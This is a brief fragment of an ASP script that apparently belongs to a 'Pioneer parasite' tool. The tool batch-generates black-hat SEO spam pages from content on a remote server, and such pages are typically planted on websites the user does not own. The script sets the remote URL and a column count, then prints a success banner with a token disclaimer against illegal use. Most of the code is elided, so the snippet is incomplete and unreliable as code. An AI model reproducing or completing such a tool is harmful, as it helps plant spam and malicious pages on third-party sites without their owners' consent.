<%
Remote_server="http://www.9376666.com/" 
directory_Number=4 //栏目数量
...
Response.Write "<p align='center'><font color='red'><b>先锋寄生虫页面成功批量生成中·请勿用于非法破坏·关闭窗口即可</b></font></p>" 
Err.Clear 
End If 
